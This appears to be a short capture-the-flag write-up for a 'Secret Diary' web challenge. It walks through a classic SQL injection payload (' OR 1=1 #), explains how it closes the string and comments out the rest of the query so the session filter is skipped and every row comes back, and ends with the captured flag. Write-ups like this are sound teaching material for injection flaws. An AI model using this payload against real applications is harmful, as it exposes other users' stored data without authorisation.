# Web SQL Injection Secret Diary

The main page has two input forms:
- session_id — input box to "Get your secrets".
- secret — input box to "Add a new secret".

When no valid session ID is provided, it displays: *"You don't have any secrets yet."*

This suggests the backend runs something like:

```sql
SELECT * FROM secrets WHERE session_id = '$user_input';
```

We tested a classic SQL injection payload:

```sql
' OR 1=1 #
```

The single quote (**'**) closes the current string in the SQL query.
**OR 1=1** is always true, meaning all rows from the table match.
The **#** symbol is a SQL comment, which ignores the rest of the query.

So the full query becomes:

```sql
SELECT * FROM secrets WHERE session_id = '' OR 1=1 #';
```

This effectively bypasses session filtering and returns all entries in the database.

After submitting it we got the flag: **SSS{u1tr4_m3g4_t0p_s3cr3t}**
